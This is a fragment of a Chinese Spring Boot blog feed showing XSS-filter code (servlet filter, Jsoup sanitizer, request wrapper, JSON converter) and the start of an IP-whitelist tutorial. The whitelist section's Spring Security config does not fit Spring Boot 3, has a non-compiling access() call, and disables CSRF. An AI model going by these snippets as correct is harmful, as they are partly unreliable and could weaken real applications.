class="string">&quot;XssFilter&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置过滤器的执行顺序，数值越小，优先级越高</span></span><br><span class="line">        registrationBean.setOrder(<span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 创建一个Map，用于存储过滤器的初始化参数</span></span><br><span class="line">        Map&lt;String, String&gt; initParameters = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 将配置文件中的&quot;excludes&quot;属性设置到过滤器的初始化参数中</span></span><br><span class="line">        initParameters.put(<span class="string">&quot;excludes&quot;</span>, excludes);</span><br><span class="line">        <span class="comment">// 将配置文件中的&quot;enabled&quot;属性设置到过滤器的初始化参数中</span></span><br><span class="line">        initParameters.put(<span class="string">&quot;enabled&quot;</span>, enabled);</span><br><span class="line">        <span class="comment">// 将初始化参数设置到FilterRegistrationBean中</span></span><br><span class="line">        registrationBean.setInitParameters(initParameters);</span><br><span class="line">        <span class="comment">// 返回FilterRegistrationBean，包含了XssFilter的配置信息</span></span><br><span class="line">        <span class="keyword">return</span> registrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-修改配置文件"><a href="#2-3-修改配置文件" class="headerlink" title="2.3 修改配置文件"></a>2.3 修改配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">xss:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">excludes:</span></span><br><span class="line">  <span class="attr">url-patterns:</span> <span class="string">/*</span></span><br></pre></td></tr></table></figure>
<h3 id="2-4-创建XSSFilter类"><a href="#2-4-创建XSSFilter类" class="headerlink" title="2.4 创建XSSFilter类"></a>2.4 创建XSSFilter类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存储需要排除XSS过滤的URL模式列表。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; excludes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否启用XSS过滤的标志。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">enabled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化过滤器，从过滤器配置中读取排除列表和启用状态。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filterConfig 过滤器配置对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException 如果初始化过程中出现错误。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strExcludes</span> <span class="operator">=</span> filterConfig.getInitParameter(<span class="string">&quot;excludes&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">strEnabled</span> <span class="operator">=</span> filterConfig.getInitParameter(<span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">        <span class="comment">//将不需要xss过滤的接口添加到列表中</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(strExcludes)) &#123;</span><br><span class="line">            String[] urls = strExcludes.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (String url : urls) &#123;</span><br><span class="line">                excludes.add(url);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(strEnabled)) &#123;</span><br><span class="line">            enabled = Boolean.valueOf(strEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行过滤逻辑，如果当前请求不在排除列表中，则通过XSS过滤器包装请求。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  HTTP请求对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response HTTP响应对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain    过滤器链对象，用于继续或中断请求处理。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException      如果处理过程中出现I/O错误。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException 如果处理过程中出现Servlet相关错误。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line">        <span class="comment">//如果该访问接口在排除列表里面则不拦截</span></span><br><span class="line">        <span class="keyword">if</span> (isExcludeUrl(req.getServletPath())) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        log.info(<span class="string">&quot;uri:&#123;&#125;&quot;</span>, req.getRequestURI());</span><br><span class="line">        <span class="comment">// xss 过滤</span></span><br><span class="line">        chain.doFilter(<span class="keyword">new</span> <span class="title class_">XssWrapper</span>(req), resp);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 销毁过滤器，释放资源。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 无需额外的销毁逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断当前请求的URL是否应该被排除在XSS过滤之外。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> urlPath 请求的URL路径。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果请求应该被排除，则返回true；否则返回false。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isExcludeUrl</span><span class="params">(String urlPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!enabled) &#123;</span><br><span class="line">            <span class="comment">//如果xss开关关闭了，则所有url都不拦截</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (excludes == <span class="literal">null</span> || excludes.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> urlPath;</span><br><span class="line">        <span class="keyword">for</span> (String pattern : excludes) &#123;</span><br><span class="line">            <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^&quot;</span> + pattern);</span><br><span class="line">            <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(url);</span><br><span class="line">            <span class="keyword">if</span> (m.find()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-5-编写过滤工具类"><a href="#2-5-编写过滤工具类" class="headerlink" title="2.5 编写过滤工具类"></a>2.5 编写过滤工具类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * XSS过滤工具类，使用Jsoup库对输入的字符串进行XSS攻击防护</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssUtil</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用自带的 basicWithImages 白名单</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Safelist</span> <span class="variable">WHITE_LIST</span> <span class="operator">=</span> Safelist.relaxed();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义输出设置，关闭prettyPrint（prettyPrint=false），目的是避免在清理过程中对代码进行格式化</span></span><br><span class="line"><span class="comment">     * 从而保持输入和输出内容的一致性。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Document.<span class="type">OutputSettings</span> <span class="variable">OUTPUT_SETTINGS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Document</span>.OutputSettings().prettyPrint(<span class="literal">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      初始化白名单策略，允许所有标签拥有style属性。</span></span><br><span class="line"><span class="comment">      这是因为在富文本编辑中，样式通常通过style属性来定义，需要确保这些样式能够被保留。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 富文本编辑时一些样式是使用 style 来进行实现的</span></span><br><span class="line">        <span class="comment">// 比如红色字体 style=&quot;color:red;&quot;</span></span><br><span class="line">        <span class="comment">// 所以需要给所有标签添加 style 属性</span></span><br><span class="line">        WHITE_LIST.addAttributes(<span class="string">&quot;:all&quot;</span>, <span class="string">&quot;style&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 清理输入的字符串，移除潜在的XSS攻击代码。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> content 待清理的字符串，通常是用户输入的HTML内容。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 清理后的字符串，保证不包含XSS攻击代码。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">clean</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用定义好的白名单策略和输出设置清理输入的字符串</span></span><br><span class="line">        <span class="keyword">return</span> Jsoup.clean(content, <span class="string">&quot;&quot;</span>, WHITE_LIST, OUTPUT_SETTINGS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-6-编写XSSRequestWrapper类清理脚本"><a href="#2-6-编写XSSRequestWrapper类清理脚本" class="headerlink" title="2.6 编写XSSRequestWrapper类清理脚本"></a>2.6 编写XSSRequestWrapper类清理脚本</h3><p>在XSSFilter类中，我们创建了一个新的XSSRequestWrapper类，该类继承自HttpServletRequestWrapper。在这个包装类中，我们将重写getParameter等方法，以清理请求参数中的潜在XSS脚本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssWrapper</span> <span class="keyword">extends</span> <span class="title class_">HttpServletRequestWrapper</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a request object wrapping the given request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request The request to wrap</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if the request is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XssWrapper</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(request);</span><br><span class="line">        log.info(<span class="string">&quot;XssWrapper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对数组参数进行特殊字符过滤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String name) &#123;</span><br><span class="line">        String[] values = <span class="built_in">super</span>.getParameterValues(name);</span><br><span class="line">        <span class="keyword">if</span> (values == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> values.length;</span><br><span class="line">        String[] encodedValues = <span class="keyword">new</span> <span class="title class_">String</span>[count];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            encodedValues[i] = cleanXSS(values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encodedValues;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对参数中特殊字符进行过滤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParameter</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.getParameter(name);</span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isBlank(value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取attribute,特殊字符过滤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getAttribute</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.getAttribute(name);</span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String &amp;&amp; StrUtil.isNotBlank((String) value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> cleanXSS((String) value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对请求头部进行特殊字符过滤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeader</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.getHeader(name);</span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isBlank(value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 清理输入的字符串以防止XSS攻击</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value 待清理的字符串，通常为用户输入或来自不可信源的数据。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 清理后的字符串，移除了可能的XSS攻击代码。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">cleanXSS</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> XssUtil.clean(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-7-自定义json消息解析器"><a href="#2-7-自定义json消息解析器" class="headerlink" title="2.7 自定义json消息解析器"></a>2.7 自定义json消息解析器</h3><p>在使用springboot中，类似于普通的参数parameter，attribute，header一类的，可以直接使用过滤器来过滤。而前端发送回来的json字符串就没那么方便过滤了。可以考虑用自定义json消息解析器来过滤前端传递的json。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在读取和写入JSON数据时特殊字符避免xss攻击的消息解析器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XSSMappingJackson2HttpMessageConverter</span> <span class="keyword">extends</span> <span class="title class_">MappingJackson2HttpMessageConverter</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从HTTP输入消息中读取对象，同时应用XSS防护。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type        类型令牌，表示要读取的对象类型。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> contextClass    上下文类，提供类型解析的上下文信息。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputMessage HTTP输入消息，包含要读取的JSON数据。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 从输入消息中解析出的对象，经过XSS防护处理。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果发生I/O错误。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpMessageNotReadableException 如果消息无法读取。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">read</span><span class="params">(Type type, Class contextClass,</span></span><br><span class="line"><span class="params">                       HttpInputMessage inputMessage)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">            HttpMessageNotReadableException &#123;</span><br><span class="line">        <span class="type">JavaType</span> <span class="variable">javaType</span> <span class="operator">=</span> getJavaType(type, contextClass);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readJavaType(javaType, inputMessage);</span><br><span class="line">        <span class="comment">//得到请求json</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="built_in">super</span>.getObjectMapper().writeValueAsString(obj);</span><br><span class="line">        <span class="comment">//过滤特殊字符</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> XssUtil.clean(json);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resultObj</span> <span class="operator">=</span> <span class="built_in">super</span>.getObjectMapper().readValue(result, javaType);</span><br><span class="line">        <span class="keyword">return</span> resultObj;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从HTTP输入消息中读取指定Java类型的对象，内部使用。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> javaType    要读取的对象的Java类型。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputMessage HTTP输入消息，包含要读取的JSON数据。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 从输入消息中解析出的对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果发生I/O错误。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpMessageNotReadableException 如果消息无法读取。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readJavaType</span><span class="params">(JavaType javaType, HttpInputMessage inputMessage)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.getObjectMapper().readValue(inputMessage.getBody(), javaType);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpMessageNotReadableException</span>(<span class="string">&quot;Could not read JSON: &quot;</span> + ex.getMessage(), ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将对象写入HTTP输出消息，同时应用XSS防护。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 要写入的对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputMessage HTTP输出消息，对象将被序列化为JSON并写入此消息。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果发生I/O错误。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpMessageNotWritableException 如果消息无法写入。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeInternal</span><span class="params">(Object object, HttpOutputMessage outputMessage)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, HttpMessageNotWritableException &#123;</span><br><span class="line">        <span class="comment">//得到要输出的json</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="built_in">super</span>.getObjectMapper().writeValueAsString(object);</span><br><span class="line">        <span class="comment">//过滤特殊字符</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> XssUtil.clean(json);</span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        outputMessage.getBody().write(result.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在启动类添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> HttpMessageConverters <span class="title function_">xssHttpMessageConverters</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">XSSMappingJackson2HttpMessageConverter</span> <span class="variable">xssMappingJackson2HttpMessageConverter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XSSMappingJackson2HttpMessageConverter</span>();</span><br><span class="line">    <span class="type">HttpMessageConverter</span> <span class="variable">converter</span> <span class="operator">=</span> xssMappingJackson2HttpMessageConverter;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HttpMessageConverters</span>(converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能八【实现白名单访问接口】</title>
    <url>/cnblogs.github.io/p/304b.html</url>
    <content><![CDATA[<blockquote>
<p>Spring Boot3 实现白名单访问接口的多种方式</p>
</blockquote>
<h3 id="（一）使用-Spring-Security"><a href="#（一）使用-Spring-Security" class="headerlink" title="（一）使用 Spring Security"></a>（一）使用 Spring Security</h3><p>Spring Security 是 Spring 家族中用于提供安全访问控制解决方案的强大框架。在 Spring Boot3 中借助它来实现白名单访问控制，能为我们提供很多便利。</p>
<p>简单配置单个 IP 的白名单：在 Spring Security 的配置类中，重写configure(HttpSecurity http)方法，使用http.authorizeRequests().antMatchers(“&#x2F;**”).access(“hasIpAddress(‘你的IP地址’)”)来限制访问。不过，这种方式只适合设置单个 IP 的白名单场景。例如，如果你的开发测试环境只有一台固定 IP 的服务器需要访问应用，采用这种配置就较为简便。</p>
<p>针对白名单列表的自定义表达式：当我们面临多个 IP 需要加入白名单时，就需要自定义表达式来实现。首先，定义一个新的表达式，比如创建一个IpWhiteListExpressionRoot类，继承自SecurityExpressionRoot并实现自定义的方法用于判断 IP 是否在白名单列表中。然后在配置类中，通过<br>ExpressionUrlAuthorizationConfigurer来使用这个自定义表达式。假设我们有一个包含多个 IP 的白名单列表<code>List&lt;String&gt;</code> whiteListIps，可以这样配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; whiteListIps;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecurityConfig</span><span class="params">(List&lt;String&gt; whiteListIps)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.whiteListIps = whiteListIps;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">           .authorizeRequests()</span><br><span class="line">               .antMatchers(<span class="string">&quot;/**&quot;</span>).access(<span class="keyword">new</span> <span class="title class_">CustomIpAccessExpression</span>(whiteListIps))</span><br><span class="line">               .and()</span><br><span class="line">           .csrf().disable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中CustomIpAccessExpression类实现了SecurityExpression接口，在其getExpression方法中进行 IP 在白名单列表中的判断逻辑。</p>
<h3 id="（二）自定义-Filter"><a href="#（二）自定义-Filter" class="headerlink" title="（二）自定义 Filter"></a>（二）自定义 Filter</h3><p>如果不想依赖 Spring Security，或者希望实现更细粒度的控制，编写一个自定义的 Filter 来实现 IP 白名单拦截是个不错的选择。<br><strong>实现 Filter 接口：</strong>创建一个类实现javax.servlet.Filter接口。在doFilter方法中，获取请求的 IP 地址，并与白名单中的 IP 进行比对。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpWhiteListFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; whiteListIps;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IpWhiteListFilter</span><span class="params">(List&lt;String&gt; whiteListIps)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.whiteListIps = whiteListIps;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">String</span> <span class="variable">clientIp</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line">        <span class="keyword">if</span> (whiteListIps.contains(clientIp)) &#123;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;Your IP is not in the white list. Access denied.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 